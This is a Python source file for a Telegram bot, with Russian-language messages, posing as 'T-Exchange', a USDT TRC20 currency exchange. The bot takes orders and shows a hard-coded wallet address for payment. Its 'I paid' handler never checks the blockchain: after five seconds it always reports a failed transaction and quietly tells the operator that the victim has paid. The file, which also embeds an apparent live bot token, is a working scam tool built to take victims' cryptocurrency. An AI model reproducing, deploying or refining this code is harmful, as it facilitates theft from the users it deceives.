# язык: Python 3.11+, файл: bot.py
# pip install aiogram
# запуск: python bot.py

import asyncio, sqlite3, logging
from datetime import datetime, timezone
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart
from aiogram.types import (Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardRemove)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN   = "8456759656:AAEoTUQuLCJ8_d_nNONbOHiaDXtNbM6kEiY"
TRC20_ADDR  = "TFk8vNZzdnNhviiWmBhqVGZC4ZSuPMG6dE"
OPERATOR_ID = 8296717436
DB          = "exchange.db"

logging.basicConfig(level=logging.INFO)

RATES = {
    "KZT": 520.0,
    "RUB": 95.0,
    "UAH": 42.0,
    "USD": 1.0,
}

class Steps(StatesGroup):
    choose_currency = State()
    amount          = State()
    paying          = State()

def db_init():
    con = sqlite3.connect(DB)
    con.execute("""CREATE TABLE IF NOT EXISTS orders(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tg_id INTEGER, username TEXT,
        currency TEXT, amount REAL, usdt REAL,
        status TEXT, created TEXT)""")
    con.commit(); con.close()

def db_add(tg_id, username, currency, amount, usdt):
    con = sqlite3.connect(DB)
    cur = con.execute("INSERT INTO orders(tg_id,username,currency,amount,usdt,status,created) VALUES(?,?,?,?,?,?,?)",
        (tg_id, username, currency, amount, usdt, "created",
         datetime.now(timezone.utc).isoformat()))
    oid = cur.lastrowid; con.commit(); con.close(); return oid

router = Router()

def kb_start():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💱 Начать обмен", callback_data="start")]])

def kb_currency():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇰🇿 Тенге (KZT)", callback_data="cur_KZT"),
         InlineKeyboardButton(text="🇷🇺 Рубли (RUB)", callback_data="cur_RUB")],
        [InlineKeyboardButton(text="🇺🇦 Гривны (UAH)", callback_data="cur_UAH"),
         InlineKeyboardButton(text="💵 Доллары (USD)", callback_data="cur_USD")]])

def kb_paid():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid")]])

@router.message(CommandStart())
async def start(m: Message, state: FSMContext):
    await state.clear()
    await m.answer(
        "💱 <b>T-Exchange</b>\n\n"
        "Быстрый обмен USDT (TRC20).\n"
        "Работаем с KZT, RUB, UAH, USD.\n\n"
        "Нажми кнопку ниже, чтобы начать.",
        parse_mode="HTML", reply_markup=kb_start())

@router.callback_query(F.data == "start")
async def start_exchange(c: CallbackQuery, state: FSMContext):
    await state.set_state(Steps.choose_currency)
    await c.message.answer(
        "🌍 <b>Выбери валюту</b>, которую хочешь обменять на USDT:",
        parse_mode="HTML", reply_markup=kb_currency())
    await c.answer()

@router.callback_query(F.data.startswith("cur_"))
async def choose_currency(c: CallbackQuery, state: FSMContext):
    currency = c.data.replace("cur_", "")
    rate = RATES.get(currency, 1.0)
    await state.update_data(currency=currency, rate=rate)
    await state.set_state(Steps.amount)
    
    symbols = {"KZT": "₸", "RUB": "₽", "UAH": "₴", "USD": "$"}
    sym = symbols.get(currency, "")
    
    await c.message.answer(
        f"💰 Валюта: <b>{currency}</b>\n"
        f"Курс: <b>1 USDT = {rate} {sym}</b>\n\n"
        f"Введи сумму в {currency}:",
        parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
    await c.answer()

@router.message(Steps.amount, F.text)
async def get_amount(m: Message, state: FSMContext):
    data = await state.get_data()
    currency = data.get("currency", "USD")
    rate = data.get("rate", 1.0)
    
    try:
        amount = float(m.text.strip().replace(",", ".").replace(" ", ""))
        if amount <= 0: raise ValueError
    except:
        await m.answer("Введи число. Например: 50000");
        return
    
    usdt = round(amount / rate, 2)
    
    if usdt < 1:
        await m.answer(f"Минимум: 1 USDT (~{int(rate)} {currency}). Попробуй больше.")
        return
    
    oid = db_add(m.from_user.id, m.from_user.username or "",
                 currency, amount, usdt)
    
    if OPERATOR_ID:
        try:
            await m.bot.send_message(OPERATOR_ID,
                f"🎯 НОВЫЙ ОРДЕР #{oid}\n"
                f"user: @{m.from_user.username} ({m.from_user.id})\n"
                f"сумма: {amount} {currency}\n"
                f"к оплате: {usdt} USDT")
        except: pass
    
    await state.set_state(Steps.paying)
    await m.answer(
        f"📋 <b>Ордер #{oid}</b>\n\n"
        f"Сумма: <b>{amount:,.0f} {currency}</b>\n"
        f"К оплате: <b>{usdt} USDT</b>\n\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>USDT TRC20 адрес:</b>\n"
        f"<code>{TRC20_ADDR}</code>\n"
        f"━━━━━━━━━━━━━━━━━\n\n"
        f"Отправь ровно <b>{usdt} USDT</b> на адрес и нажми «Я оплатил».\n\n"
        f"⏱ Ордер действителен 30 минут.",
        parse_mode="HTML",
        reply_markup=kb_paid())

@router.callback_query(F.data == "paid")
async def paid(c: CallbackQuery, state: FSMContext):
    await c.message.answer(
        "⏳ <b>Проверка транзакции…</b>\n\n"
        "Пожалуйста, подождите 1–2 минуты.",
        parse_mode="HTML")
    
    await asyncio.sleep(5)
    
    await c.message.answer(
        "❌ <b>Ошибка обработки</b>\n\n"
        "Транзакция не подтверждена.\n\n"
        "Возможные причины:\n"
        "• Неверная сумма перевода\n"
        "• Токен отправлен в другой сети (нужна TRC20)\n"
        "• Задержка сети TRON\n\n"
        "Проверьте детали и повторите, или напишите в поддержку: @твой_саппорт",
        parse_mode="HTML")
    
    if OPERATOR_ID:
        try:
            await c.bot.send_message(OPERATOR_ID,
                f"💸 {c.from_user.username} нажал «Я оплатил»")
        except: pass
    
    await state.clear()
    await c.answer()

async def main():
    db_init()
    bot = Bot(BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
